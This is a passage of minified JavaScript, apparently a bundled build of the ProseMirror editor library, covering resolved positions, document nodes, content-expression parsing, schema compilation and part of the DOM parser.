ci(s,lC(t,o,a,e,r))}else return ci(s,Au(t,e,r))}function aC(t,e){if(!e.type.compatibleContent(t.type))throw new Nu("Cannot join "+e.type.name+" onto "+t.type.name)}function Jh(t,e,n){let r=t.node(n);return aC(r,e.node(n)),r}function ui(t,e){let n=e.length-1;n>=0&&t.isText&&t.sameMarkup(e[n])?e[n]=t.withText(e[n].text+t.text):e.push(t)}function Mo(t,e,n,r){let i=(e||t).node(n),s=0,o=e?e.index(n):i.childCount;t&&(s=t.index(n),t.depth>n?s++:t.textOffset&&(ui(t.nodeAfter,r),s++));for(let a=s;a<o;a++)ui(i.child(a),r);e&&e.depth==n&&e.textOffset&&ui(e.nodeBefore,r)}function ci(t,e){return t.type.checkContent(e),t.copy(e)}function lC(t,e,n,r,i){let s=t.depth>i&&Jh(t,e,i+1),o=r.depth>i&&Jh(n,r,i+1),a=[];return Mo(null,t,i,a),s&&o&&e.index(i)==n.index(i)?(aC(s,o),ui(ci(s,lC(t,e,n,r,i+1)),a)):(s&&ui(ci(s,Au(t,e,i+1)),a),Mo(e,n,i,a),o&&ui(ci(o,Au(n,r,i+1)),a)),Mo(r,null,i,a),new A(a)}function Au(t,e,n){let r=[];if(Mo(null,t,n,r),t.depth>n){let i=Jh(t,e,n+1);ui(ci(i,Au(t,e,n+1)),r)}return Mo(e,null,n,r),new A(r)}function Rj(t,e){let n=e.depth-t.openStart,i=e.node(n).copy(t.content);for(let s=n-1;s>=0;s--)i=e.node(s).copy(A.from(i));return{start:i.resolveNoCache(t.openStart+n),end:i.resolveNoCache(i.content.size-t.openEnd-n)}}class ca{constructor(e,n,r){this.pos=e,this.path=n,this.parentOffset=r,this.depth=n.length/3-1}resolveDepth(e){return e==null?this.depth:e<0?this.depth+e:e}get parent(){return this.node(this.depth)}get doc(){return this.node(0)}node(e){return this.path[this.resolveDepth(e)*3]}index(e){return this.path[this.resolveDepth(e)*3+1]}indexAfter(e){return e=this.resolveDepth(e),this.index(e)+(e==this.depth&&!this.textOffset?0:1)}start(e){return e=this.resolveDepth(e),e==0?0:this.path[e*3-1]+1}end(e){return e=this.resolveDepth(e),this.start(e)+this.node(e).content.size}before(e){if(e=this.resolveDepth(e),!e)throw new RangeError("There is no position before the top-level node");return e==this.depth+1?this.pos:this.path[e*3-1]}after(e){if(e=this.resolveDepth(e),!e)throw new RangeError("There is no position after the top-level node");return e==this.depth+1?this.pos:this.path[e*3-1]+this.path[e*3].nodeSize}get textOffset(){return this.pos-this.path[this.path.length-1]}get nodeAfter(){let e=this.parent,n=this.index(this.depth);if(n==e.childCount)return null;let r=this.pos-this.path[this.path.length-1],i=e.child(n);return r?e.child(n).cut(r):i}get nodeBefore(){let e=this.index(this.depth),n=this.pos-this.path[this.path.length-1];return n?this.parent.child(e).cut(0,n):e==0?null:this.parent.child(e-1)}posAtIndex(e,n){n=this.resolveDepth(n);let r=this.path[n*3],i=n==0?0:this.path[n*3-1]+1;for(let s=0;s<e;s++)i+=r.child(s).nodeSize;return i}marks(){let e=this.parent,n=this.index();if(e.content.size==0)return ee.none;if(this.textOffset)return e.child(n).marks;let r=e.maybeChild(n-1),i=e.maybeChild(n);if(!r){let a=r;r=i,i=a}let s=r.marks;for(var o=0;o<s.length;o++)s[o].type.spec.inclusive===!1&&(!i||!s[o].isInSet(i.marks))&&(s=s[o--].removeFromSet(s));return s}marksAcross(e){let n=this.parent.maybeChild(this.index());if(!n||!n.isInline)return null;let r=n.marks,i=e.parent.maybeChild(e.index());for(var s=0;s<r.length;s++)r[s].type.spec.inclusive===!1&&(!i||!r[s].isInSet(i.marks))&&(r=r[s--].removeFromSet(r));return r}sharedDepth(e){for(let n=this.depth;n>0;n--)if(this.start(n)<=e&&this.end(n)>=e)return n;return 0}blockRange(e=this,n){if(e.pos<this.pos)return e.blockRange(this);for(let r=this.depth-(this.parent.inlineContent||this.pos==e.pos?1:0);r>=0;r--)if(e.pos<=this.end(r)&&(!n||n(this.node(r))))return new Pu(this,e,r);return null}sameParent(e){return this.pos-this.parentOffset==e.pos-e.parentOffset}max(e){return e.pos>this.pos?e:this}min(e){return e.pos<this.pos?e:this}toString(){let e="";for(let n=1;n<=this.depth;n++)e+=(e?"/":"")+this.node(n).type.name+"_"+this.index(n-1);return e+":"+this.parentOffset}static resolve(e,n){if(!(n>=0&&n<=e.content.size))throw new RangeError("Position "+n+" out of range");let r=[],i=0,s=n;for(let o=e;;){let{index:a,offset:l}=o.content.findIndex(s),u=s-l;if(r.push(o,a,i+l),!u||(o=o.child(a),o.isText))break;s=u-1,i+=l+1}return new ca(n,r,s)}static resolveCached(e,n){let r=Wx.get(e);if(r)for(let s=0;s<r.elts.length;s++){let o=r.elts[s];if(o.pos==n)return o}else Wx.set(e,r=new Oj);let i=r.elts[r.i]=ca.resolve(e,n);return r.i=(r.i+1)%Dj,i}}class Oj{constructor(){this.elts=[],this.i=0}}const Dj=12,Wx=new WeakMap;class Pu{constructor(e,n,r){this.$from=e,this.$to=n,this.depth=r}get start(){return this.$from.before(this.depth+1)}get end(){return this.$to.after(this.depth+1)}get parent(){return this.$from.node(this.depth)}get startIndex(){return this.$from.index(this.depth)}get endIndex(){return this.$to.indexAfter(this.depth)}}const Lj=Object.create(null);class sn{constructor(e,n,r,i=ee.none){this.type=e,this.attrs=n,this.marks=i,this.content=r||A.empty}get children(){return this.content.content}get nodeSize(){return this.isLeaf?1:2+this.content.size}get childCount(){return this.content.childCount}child(e){return this.content.child(e)}maybeChild(e){return this.content.maybeChild(e)}forEach(e){this.content.forEach(e)}nodesBetween(e,n,r,i=0){this.content.nodesBetween(e,n,r,i,this)}descendants(e){this.nodesBetween(0,this.content.size,e)}get textContent(){return this.isLeaf&&this.type.spec.leafText?this.type.spec.leafText(this):this.textBetween(0,this.content.size,"")}textBetween(e,n,r,i){return this.content.textBetween(e,n,r,i)}get firstChild(){return this.content.firstChild}get lastChild(){return this.content.lastChild}eq(e){return this==e||this.sameMarkup(e)&&this.content.eq(e.content)}sameMarkup(e){return this.hasMarkup(e.type,e.attrs,e.marks)}hasMarkup(e,n,r){return this.type==e&&Mu(this.attrs,n||e.defaultAttrs||Lj)&&ee.sameSet(this.marks,r||ee.none)}copy(e=null){return e==this.content?this:new sn(this.type,this.attrs,e,this.marks)}mark(e){return e==this.marks?this:new sn(this.type,this.attrs,this.content,e)}cut(e,n=this.content.size){return e==0&&n==this.content.size?this:this.copy(this.content.cut(e,n))}slice(e,n=this.content.size,r=!1){if(e==n)return L.empty;let i=this.resolve(e),s=this.resolve(n),o=r?0:i.sharedDepth(n),a=i.start(o),u=i.node(o).content.cut(i.pos-a,s.pos-a);return new L(u,i.depth-o,s.depth-o)}replace(e,n,r){return Pj(this.resolve(e),this.resolve(n),r)}nodeAt(e){for(let n=this;;){let{index:r,offset:i}=n.content.findIndex(e);if(n=n.maybeChild(r),!n)return null;if(i==e||n.isText)return n;e-=i+1}}childAfter(e){let{index:n,offset:r}=this.content.findIndex(e);return{node:this.content.maybeChild(n),index:n,offset:r}}childBefore(e){if(e==0)return{node:null,index:0,offset:0};let{index:n,offset:r}=this.content.findIndex(e);if(r<e)return{node:this.content.child(n),index:n,offset:r};let i=this.content.child(n-1);return{node:i,index:n-1,offset:r-i.nodeSize}}resolve(e){return ca.resolveCached(this,e)}resolveNoCache(e){return ca.resolve(this,e)}rangeHasMark(e,n,r){let i=!1;return n>e&&this.nodesBetween(e,n,s=>(r.isInSet(s.marks)&&(i=!0),!i)),i}get isBlock(){return this.type.isBlock}get isTextblock(){return this.type.isTextblock}get inlineContent(){return this.type.inlineContent}get isInline(){return this.type.isInline}get isText(){return this.type.isText}get isLeaf(){return this.type.isLeaf}get isAtom(){return this.type.isAtom}toString(){if(this.type.spec.toDebugString)return this.type.spec.toDebugString(this);let e=this.type.name;return this.content.size&&(e+="("+this.content.toStringInner()+")"),uC(this.marks,e)}contentMatchAt(e){let n=this.type.contentMatch.matchFragment(this.content,0,e);if(!n)throw new Error("Called contentMatchAt on a node with invalid content");return n}canReplace(e,n,r=A.empty,i=0,s=r.childCount){let o=this.contentMatchAt(e).matchFragment(r,i,s),a=o&&o.matchFragment(this.content,n);if(!a||!a.validEnd)return!1;for(let l=i;l<s;l++)if(!this.type.allowsMarks(r.child(l).marks))return!1;return!0}canReplaceWith(e,n,r,i){if(i&&!this.type.allowsMarks(i))return!1;let s=this.contentMatchAt(e).matchType(r),o=s&&s.matchFragment(this.content,n);return o?o.validEnd:!1}canAppend(e){return e.content.size?this.canReplace(this.childCount,this.childCount,e.content):this.type.compatibleContent(e.type)}check(){this.type.checkContent(this.content),this.type.checkAttrs(this.attrs);let e=ee.none;for(let n=0;n<this.marks.length;n++){let r=this.marks[n];r.type.checkAttrs(r.attrs),e=r.addToSet(e)}if(!ee.sameSet(e,this.marks))throw new RangeError(`Invalid collection of marks for node ${this.type.name}: ${this.marks.map(n=>n.type.name)}`);this.content.forEach(n=>n.check())}toJSON(){let e={type:this.type.name};for(let n in this.attrs){e.attrs=this.attrs;break}return this.content.size&&(e.content=this.content.toJSON()),this.marks.length&&(e.marks=this.marks.map(n=>n.toJSON())),e}static fromJSON(e,n){if(!n)throw new RangeError("Invalid input for Node.fromJSON");let r;if(n.marks){if(!Array.isArray(n.marks))throw new RangeError("Invalid mark data for Node.fromJSON");r=n.marks.map(e.markFromJSON)}if(n.type=="text"){if(typeof n.text!="string")throw new RangeError("Invalid text node in JSON");return e.text(n.text,r)}let i=A.fromJSON(e,n.content),s=e.nodeType(n.type).create(n.attrs,i,r);return s.type.checkAttrs(s.attrs),s}}sn.prototype.text=void 0;class Ru extends sn{constructor(e,n,r,i){if(super(e,n,null,i),!r)throw new RangeError("Empty text nodes are not allowed");this.text=r}toString(){return this.type.spec.toDebugString?this.type.spec.toDebugString(this):uC(this.marks,JSON.stringify(this.text))}get textContent(){return this.text}textBetween(e,n){return this.text.slice(e,n)}get nodeSize(){return this.text.length}mark(e){return e==this.marks?this:new Ru(this.type,this.attrs,this.text,e)}withText(e){return e==this.text?this:new Ru(this.type,this.attrs,e,this.marks)}cut(e=0,n=this.text.length){return e==0&&n==this.text.length?this:this.withText(this.text.slice(e,n))}eq(e){return this.sameMarkup(e)&&this.text==e.text}toJSON(){let e=super.toJSON();return e.text=this.text,e}}function uC(t,e){for(let n=t.length-1;n>=0;n--)e=t[n].type.name+"("+e+")";return e}class Si{constructor(e){this.validEnd=e,this.next=[],this.wrapCache=[]}static parse(e,n){let r=new Ij(e,n);if(r.next==null)return Si.empty;let i=cC(r);r.next&&r.err("Unexpected trailing text");let s=$j(_j(i));return Hj(s,r),s}matchType(e){for(let n=0;n<this.next.length;n++)if(this.next[n].type==e)return this.next[n].next;return null}matchFragment(e,n=0,r=e.childCount){let i=this;for(let s=n;i&&s<r;s++)i=i.matchType(e.child(s).type);return i}get inlineContent(){return this.next.length!=0&&this.next[0].type.isInline}get defaultType(){for(let e=0;e<this.next.length;e++){let{type:n}=this.next[e];if(!(n.isText||n.hasRequiredAttrs()))return n}return null}compatible(e){for(let n=0;n<this.next.length;n++)for(let r=0;r<e.next.length;r++)if(this.next[n].type==e.next[r].type)return!0;return!1}fillBefore(e,n=!1,r=0){let i=[this];function s(o,a){let l=o.matchFragment(e,r);if(l&&(!n||l.validEnd))return A.from(a.map(u=>u.createAndFill()));for(let u=0;u<o.next.length;u++){let{type:c,next:d}=o.next[u];if(!(c.isText||c.hasRequiredAttrs())&&i.indexOf(d)==-1){i.push(d);let f=s(d,a.concat(c));if(f)return f}}return null}return s(this,[])}findWrapping(e){for(let r=0;r<this.wrapCache.length;r+=2)if(this.wrapCache[r]==e)return this.wrapCache[r+1];let n=this.computeWrapping(e);return this.wrapCache.push(e,n),n}computeWrapping(e){let n=Object.create(null),r=[{match:this,type:null,via:null}];for(;r.length;){let i=r.shift(),s=i.match;if(s.matchType(e)){let o=[];for(let a=i;a.type;a=a.via)o.push(a.type);return o.reverse()}for(let o=0;o<s.next.length;o++){let{type:a,next:l}=s.next[o];!a.isLeaf&&!a.hasRequiredAttrs()&&!(a.name in n)&&(!i.type||l.validEnd)&&(r.push({match:a.contentMatch,type:a,via:i}),n[a.name]=!0)}}return null}get edgeCount(){return this.next.length}edge(e){if(e>=this.next.length)throw new RangeError(`There's no ${e}th edge in this content match`);return this.next[e]}toString(){let e=[];function n(r){e.push(r);for(let i=0;i<r.next.length;i++)e.indexOf(r.next[i].next)==-1&&n(r.next[i].next)}return n(this),e.map((r,i)=>{let s=i+(r.validEnd?"*":" ")+" ";for(let o=0;o<r.next.length;o++)s+=(o?", ":"")+r.next[o].type.name+"->"+e.indexOf(r.next[o].next);return s}).join(`
`)}}Si.empty=new Si(!0);class Ij{constructor(e,n){this.string=e,this.nodeTypes=n,this.inline=null,this.pos=0,this.tokens=e.split(/\s*(?=\b|\W|$)/),this.tokens[this.tokens.length-1]==""&&this.tokens.pop(),this.tokens[0]==""&&this.tokens.shift()}get next(){return this.tokens[this.pos]}eat(e){return this.next==e&&(this.pos++||!0)}err(e){throw new SyntaxError(e+" (in content expression '"+this.string+"')")}}function cC(t){let e=[];do e.push(jj(t));while(t.eat("|"));return e.length==1?e[0]:{type:"choice",exprs:e}}function jj(t){let e=[];do e.push(Fj(t));while(t.next&&t.next!=")"&&t.next!="|");return e.length==1?e[0]:{type:"seq",exprs:e}}function Fj(t){let e=zj(t);for(;;)if(t.eat("+"))e={type:"plus",expr:e};else if(t.eat("*"))e={type:"star",expr:e};else if(t.eat("?"))e={type:"opt",expr:e};else if(t.eat("{"))e=Bj(t,e);else break;return e}function Kx(t){/\D/.test(t.next)&&t.err("Expected number, got '"+t.next+"'");let e=Number(t.next);return t.pos++,e}function Bj(t,e){let n=Kx(t),r=n;return t.eat(",")&&(t.next!="}"?r=Kx(t):r=-1),t.eat("}")||t.err("Unclosed braced range"),{type:"range",min:n,max:r,expr:e}}function Vj(t,e){let n=t.nodeTypes,r=n[e];if(r)return[r];let i=[];for(let s in n){let o=n[s];o.isInGroup(e)&&i.push(o)}return i.length==0&&t.err("No node type or group '"+e+"' found"),i}function zj(t){if(t.eat("(")){let e=cC(t);return t.eat(")")||t.err("Missing closing paren"),e}else if(/\W/.test(t.next))t.err("Unexpected token '"+t.next+"'");else{let e=Vj(t,t.next).map(n=>(t.inline==null?t.inline=n.isInline:t.inline!=n.isInline&&t.err("Mixing inline and block content"),{type:"name",value:n}));return t.pos++,e.length==1?e[0]:{type:"choice",exprs:e}}}function _j(t){let e=[[]];return i(s(t,0),n()),e;function n(){return e.push([])-1}function r(o,a,l){let u={term:l,to:a};return e[o].push(u),u}function i(o,a){o.forEach(l=>l.to=a)}function s(o,a){if(o.type=="choice")return o.exprs.reduce((l,u)=>l.concat(s(u,a)),[]);if(o.type=="seq")for(let l=0;;l++){let u=s(o.exprs[l],a);if(l==o.exprs.length-1)return u;i(u,a=n())}else if(o.type=="star"){let l=n();return r(a,l),i(s(o.expr,l),l),[r(l)]}else if(o.type=="plus"){let l=n();return i(s(o.expr,a),l),i(s(o.expr,l),l),[r(l)]}else{if(o.type=="opt")return[r(a)].concat(s(o.expr,a));if(o.type=="range"){let l=a;for(let u=0;u<o.min;u++){let c=n();i(s(o.expr,l),c),l=c}if(o.max==-1)i(s(o.expr,l),l);else for(let u=o.min;u<o.max;u++){let c=n();r(l,c),i(s(o.expr,l),c),l=c}return[r(l)]}else{if(o.type=="name")return[r(a,void 0,o.value)];throw new Error("Unknown expr type")}}}}function dC(t,e){return e-t}function qx(t,e){let n=[];return r(e),n.sort(dC);function r(i){let s=t[i];if(s.length==1&&!s[0].term)return r(s[0].to);n.push(i);for(let o=0;o<s.length;o++){let{term:a,to:l}=s[o];!a&&n.indexOf(l)==-1&&r(l)}}}function $j(t){let e=Object.create(null);return n(qx(t,0));function n(r){let i=[];r.forEach(o=>{t[o].forEach(({term:a,to:l})=>{if(!a)return;let u;for(let c=0;c<i.length;c++)i[c][0]==a&&(u=i[c][1]);qx(t,l).forEach(c=>{u||i.push([a,u=[]]),u.indexOf(c)==-1&&u.push(c)})})});let s=e[r.join(",")]=new Si(r.indexOf(t.length-1)>-1);for(let o=0;o<i.length;o++){let a=i[o][1].sort(dC);s.next.push({type:i[o][0],next:e[a.join(",")]||n(a)})}return s}}function Hj(t,e){for(let n=0,r=[t];n<r.length;n++){let i=r[n],s=!i.validEnd,o=[];for(let a=0;a<i.next.length;a++){let{type:l,next:u}=i.next[a];o.push(l.name),s&&!(l.isText||l.hasRequiredAttrs())&&(s=!1),r.indexOf(u)==-1&&r.push(u)}s&&e.err("Only non-generatable nodes ("+o.join(", ")+") in a required position (see https://prosemirror.net/docs/guide/#generatable)")}}function fC(t){let e=Object.create(null);for(let n in t){let r=t[n];if(!r.hasDefault)return null;e[n]=r.default}return e}function hC(t,e){let n=Object.create(null);for(let r in t){let i=e&&e[r];if(i===void 0){let s=t[r];if(s.hasDefault)i=s.default;else throw new RangeError("No value supplied for attribute "+r)}n[r]=i}return n}function pC(t,e,n,r){for(let i in e)if(!(i in t))throw new RangeError(`Unsupported attribute ${i} for ${n} of type ${i}`);for(let i in t){let s=t[i];s.validate&&s.validate(e[i])}}function mC(t,e){let n=Object.create(null);if(e)for(let r in e)n[r]=new Wj(t,r,e[r]);return n}let Gx=class gC{constructor(e,n,r){this.name=e,this.schema=n,this.spec=r,this.markSet=null,this.groups=r.group?r.group.split(" "):[],this.attrs=mC(e,r.attrs),this.defaultAttrs=fC(this.attrs),this.contentMatch=null,this.inlineContent=null,this.isBlock=!(r.inline||e=="text"),this.isText=e=="text"}get isInline(){return!this.isBlock}get isTextblock(){return this.isBlock&&this.inlineContent}get isLeaf(){return this.contentMatch==Si.empty}get isAtom(){return this.isLeaf||!!this.spec.atom}isInGroup(e){return this.groups.indexOf(e)>-1}get whitespace(){return this.spec.whitespace||(this.spec.code?"pre":"normal")}hasRequiredAttrs(){for(let e in this.attrs)if(this.attrs[e].isRequired)return!0;return!1}compatibleContent(e){return this==e||this.contentMatch.compatible(e.contentMatch)}computeAttrs(e){return!e&&this.defaultAttrs?this.defaultAttrs:hC(this.attrs,e)}create(e=null,n,r){if(this.isText)throw new Error("NodeType.create can't construct text nodes");return new sn(this,this.computeAttrs(e),A.from(n),ee.setFrom(r))}createChecked(e=null,n,r){return n=A.from(n),this.checkContent(n),new sn(this,this.computeAttrs(e),n,ee.setFrom(r))}createAndFill(e=null,n,r){if(e=this.computeAttrs(e),n=A.from(n),n.size){let o=this.contentMatch.fillBefore(n);if(!o)return null;n=o.append(n)}let i=this.contentMatch.matchFragment(n),s=i&&i.fillBefore(A.empty,!0);return s?new sn(this,e,n.append(s),ee.setFrom(r)):null}validContent(e){let n=this.contentMatch.matchFragment(e);if(!n||!n.validEnd)return!1;for(let r=0;r<e.childCount;r++)if(!this.allowsMarks(e.child(r).marks))return!1;return!0}checkContent(e){if(!this.validContent(e))throw new RangeError(`Invalid content for node ${this.name}: ${e.toString().slice(0,50)}`)}checkAttrs(e){pC(this.attrs,e,"node",this.name)}allowsMarkType(e){return this.markSet==null||this.markSet.indexOf(e)>-1}allowsMarks(e){if(this.markSet==null)return!0;for(let n=0;n<e.length;n++)if(!this.allowsMarkType(e[n].type))return!1;return!0}allowedMarks(e){if(this.markSet==null)return e;let n;for(let r=0;r<e.length;r++)this.allowsMarkType(e[r].type)?n&&n.push(e[r]):n||(n=e.slice(0,r));return n?n.length?n:ee.none:e}static compile(e,n){let r=Object.create(null);e.forEach((s,o)=>r[s]=new gC(s,n,o));let i=n.spec.topNode||"doc";if(!r[i])throw new RangeError("Schema is missing its top node type ('"+i+"')");if(!r.text)throw new RangeError("Every schema needs a 'text' type");for(let s in r.text.attrs)throw new RangeError("The text node type should not have attributes");return r}};function Uj(t,e,n){let r=n.split("|");return i=>{let s=i===null?"null":typeof i;if(r.indexOf(s)<0)throw new RangeError(`Expected value of type ${r} for attribute ${e} on type ${t}, got ${s}`)}}class Wj{constructor(e,n,r){this.hasDefault=Object.prototype.hasOwnProperty.call(r,"default"),this.default=r.default,this.validate=typeof r.validate=="string"?Uj(e,n,r.validate):r.validate}get isRequired(){return!this.hasDefault}}class Uc{constructor(e,n,r,i){this.name=e,this.rank=n,this.schema=r,this.spec=i,this.attrs=mC(e,i.attrs),this.excluded=null;let s=fC(this.attrs);this.instance=s?new ee(this,s):null}create(e=null){return!e&&this.instance?this.instance:new ee(this,hC(this.attrs,e))}static compile(e,n){let r=Object.create(null),i=0;return e.forEach((s,o)=>r[s]=new Uc(s,i++,n,o)),r}removeFromSet(e){for(var n=0;n<e.length;n++)e[n].type==this&&(e=e.slice(0,n).concat(e.slice(n+1)),n--);return e}isInSet(e){for(let n=0;n<e.length;n++)if(e[n].type==this)return e[n]}checkAttrs(e){pC(this.attrs,e,"mark",this.name)}excludes(e){return this.excluded.indexOf(e)>-1}}class yC{constructor(e){this.linebreakReplacement=null,this.cached=Object.create(null);let n=this.spec={};for(let i in e)n[i]=e[i];n.nodes=$e.from(e.nodes),n.marks=$e.from(e.marks||{}),this.nodes=Gx.compile(this.spec.nodes,this),this.marks=Uc.compile(this.spec.marks,this);let r=Object.create(null);for(let i in this.nodes){if(i in this.marks)throw new RangeError(i+" can not be both a node and a mark");let s=this.nodes[i],o=s.spec.content||"",a=s.spec.marks;if(s.contentMatch=r[o]||(r[o]=Si.parse(o,this.nodes)),s.inlineContent=s.contentMatch.inlineContent,s.spec.linebreakReplacement){if(this.linebreakReplacement)throw new RangeError("Multiple linebreak nodes defined");if(!s.isInline||!s.isLeaf)throw new RangeError("Linebreak replacement nodes must be inline leaf nodes");this.linebreakReplacement=s}s.markSet=a=="_"?null:a?Jx(this,a.split(" ")):a==""||!s.inlineContent?[]:null}for(let i in this.marks){let s=this.marks[i],o=s.spec.excludes;s.excluded=o==null?[s]:o==""?[]:Jx(this,o.split(" "))}this.nodeFromJSON=i=>sn.fromJSON(this,i),this.markFromJSON=i=>ee.fromJSON(this,i),this.topNodeType=this.nodes[this.spec.topNode||"doc"],this.cached.wrappings=Object.create(null)}node(e,n=null,r,i){if(typeof e=="string")e=this.nodeType(e);else if(e instanceof Gx){if(e.schema!=this)throw new RangeError("Node type from different schema used ("+e.name+")")}else throw new RangeError("Invalid node type: "+e);return e.createChecked(n,r,i)}text(e,n){let r=this.nodes.text;return new Ru(r,r.defaultAttrs,e,ee.setFrom(n))}mark(e,n){return typeof e=="string"&&(e=this.marks[e]),e.create(n)}nodeType(e){let n=this.nodes[e];if(!n)throw new RangeError("Unknown node type: "+e);return n}}function Jx(t,e){let n=[];for(let r=0;r<e.length;r++){let i=e[r],s=t.marks[i],o=s;if(s)n.push(s);else for(let a in t.marks){let l=t.marks[a];(i=="_"||l.spec.group&&l.spec.group.split(" ").indexOf(i)>-1)&&n.push(o=l)}if(!o)throw new SyntaxError("Unknown mark type: '"+e[r]+"'")}return n}function Kj(t){return t.tag!=null}function qj(t){return t.style!=null}class Er{constructor(e,n){this.schema=e,this.rules=n,this.tags=[],this.styles=[];let r=this.matchedStyles=[];n.forEach(i=>{if(Kj(i))this.tags.push(i);else if(qj(i)){let s=/[^=]*/.exec(i.style)[0];r.indexOf(s)<0&&r.push(s),this.styles.push(i)}}),this.normalizeLists=!this.tags.some(i=>{if(!/^(ul|ol)\b/.test(i.tag)||!i.node)return!1;let s=e.nodes[i.node];return s.contentMatch.matchType(s)})}parse(e,n={}){let r=new Qx(this,n,!1);return r.addAll(e,ee.none,n.from,n.to),r.finish()}parseSlice(e,n={}){let r=new Qx(this,n,!0);return r.addAll(e,ee.none,n.from,n.to),L.maxOpen(r.finish())}matchTag(e,n,r){for(let i=r?this.tags.indexOf(r)+1:0;i<this.tags.length;i++){let s=this.tags[i];if(Yj(e,s.tag)&&(s.namespace===void 0||e.namespaceURI==s.namespace)&&(!s.context||n.matchesContext(s.context))){if(s.getAttrs){let o=s.getAttrs(e);if(o===!1)continue;s.attrs=o||void 0}return s}}}matchStyle(e,n,r,i){for(let s=i?this.styles.indexOf(i)+1:0;s<this.styles.length;s++){let o=this.styles[s],a=o.style;if(!(a.indexOf(e)!=0||o.context&&!r.matchesContext(o.context)||a.length>e.length&&(a.charCodeAt(e.length)!=61||a.slice(e.length+1)!=n))){if(o.getAttrs){let l=o.getAttrs(n);if(l===!1)continue;o.attrs=l||void 0}return o}}}static schemaRules(e){let n=[];function r(i){let s=i.priority==null?50:i.priority,o=0;for(;o<n.length;o++){let a=n[o];if((a.priority==null?50:a.priority)<s)break}n.splice(o,0,i)}for(let i in e.marks){let s=e.marks[i].spec.parseDOM;s&&s.forEach(o=>{r(o=Xx(o)),o.mark||o.ignore||o.clearMark||(o.mark=i)})}for(let i in e.nodes){let s=e.nodes[i].spec.parseDOM;s&&s.forEach(o=>{r(o=Xx(o)),o.node||o.ignore||o.mark||(o.node=i)})}return n}static fromSchema(e){return e.cached.domParser||(e.cached.domParser=new Er(e,Er.schemaRules(e)))}}const xC={address:!0,article:!0,aside:!0,blockquote:!0,canvas:!0,dd:!0,div:!0,dl:!0,fieldset:!0,figcaption:!0,figure:!0,footer:!0,form:!0,h1:!0,h2:!0,h3:!0,h4:!0,h5:!0,h6:!0,header:!0,hgroup:!0,hr:!0,li:!0,noscript:!0,ol:!0,output:!0,p:!0,pre:!0,section:!0,table:!0,tfoot:!0,ul:!0},Gj={head:!0,noscript:!0,object:!0,script:!0,style:!0,title:!0},vC={ol:!0,ul:!0},da=1,Yh=2,No=4;function Yx(t,e,n){return e!=null?(e?da:0)|(e==="full"?Yh:0):t&&t.whitespace=="pre"?da|Yh:n&~No}class fl{constructor(e,n,r,i,s,o){this.type=e,this.attrs=n,this.marks=r,this.solid=i,this.options=o,this.content=[],this.activeMarks=ee.none,this.match=s||(o&No?null:e.contentMatch)}findWrapping(e){if(!this.match){if(!this.type)return[];let n=this.type.contentMatch.fillBefore(A.from(e));if(n)this.match=this.type.contentMatch.matchFragment(n);else{let r=this.type.contentMatch,i;return(i=r.findWrapping(e.type))?(this.match=r,i):null}}return this.match.findWrapping(e.type)}finish(e){if(!(this.options&da)){let r=this.content[this.content.length-1],i;if(r&&r.isText&&(i=/[ \t\r\n\u000c]+$/.exec(r.text))){let s=r;r.text.length==i[0].length?this.content.pop():this.content[this.content.length-1]=s.withText(s.text.slice(0,s.text.length-i[0].length))}}let n=A.from(this.content);return!e&&this.match&&(n=n.append(this.match.fillBefore(A.empty,!0))),this.type?this.type.create(this.attrs,n,this.marks):n}inlineContext(e){return this.type?this.type.inlineContent:this.content.length?this.content[0].isInline:e.parentNode&&!xC.hasOwnProperty(e.parentNode.nodeName.toLowerCase())}}class Qx{constructor(e,n,r){this.parser=e,this.options=n,this.isOpen=r,this.open=0,this.localPreserveWS=!1;let i=n.topNode,s,o=Yx(null,n.preserveWhitespace,0)|(r?No:0);i?s=new fl(i.type,i.attrs,ee.none,!0,n.topMatch||i.type.contentMatch,o):r?s=new fl(null,null,ee.none,!0,null,o):s=new fl(e.schema.topNodeType,null,ee.none,!0,null,o),this.nodes=[s],this.find=n.findPositions,this.needsBlock=!1}get top(){return this.nodes[this.open]}addDOM(e,n){e.nodeType==3?this.addTextNode(e,n):e.nodeType==1&&this.addElement(e,n)}addTextNode(e,n){let r=e.nodeValue,i=this.top,s=i.options&Yh?"full":this.localPreserveWS||(i.options&da)>0;if(s==="full"||i.inlineContext(e)||/[^ \t\r\n\u000c]/.test(r)){if(s)s!=="full"?r=r.replace(/\r?\n|\r/g," "):r=r.replace(/\r\n?/g,`
`);else if(r=r.replace(/[ \t\r\n\u000c]+/g," "),/^[ \t\r\n\u000c]/.test(r)&&this.open==this.nodes.length-1){let o=i.content[i.content.length-1],a=e.previousSibling;(!o||a&&a.nodeName=="BR"||o.isText&&/[ \t\r\n\u000c]$/.test(o.text))&&(r=r.slice(1))}r&&this.insertNode(this.parser.schema.text(r),n,!/\S/.test(r)),this.findInText(e)}else this.findInside(e)}addElement(e,n,r){let i=this.localPreserveWS,s=this.top;(e.tagName=="PRE"||/pre/.test(e.style&&e.style.whiteSpace))&&(this.localPreserveWS=!0);let o=e.nodeName.toLowerCase(),a;vC.hasOwnProperty(o)&&this.parser.normalizeLists&&Jj(e);let l=this.options.ruleFromNode&&this.options.ruleFromNode(e)||(a=this.parser.matchTag(e,this,r));e:if(l?l.ignore:Gj.hasOwnProperty(o))this.findInside(e),this.ignoreFallback(e,n);else if(!l||l.skip||l.closeParent){l&&l.closeParent?this.open=Math.max(0,this.open-1):l&&l.skip.nodeType&&(e=l.skip);let u,c=this.needsBlock;if(xC.hasOwnProperty(o))s.content.length&&s.content[0].isInline&&this.open&&(this.open--,s=this.top),u=!0,s.type||(this.needsBlock=!0);else if(!e.firstChild){this.leafFallback(e,n);break e}let d=l&&l.skip?n:this.readStyles(e,n);d&&this.addAll(e,d),u&&this.sync(s),this.needsBlock=c}else{let u=this.readStyles(e,n);u&&this.addElementByRule(e,l,u,l.consuming===!1?a:void 0)}this.localPreserveWS=i}leafFallback(e,n){e.nodeName=="BR"&&this.top.type&&this.top.type.inlineContent&&this.addTextNode(e.ownerDocument.createTextNode(`
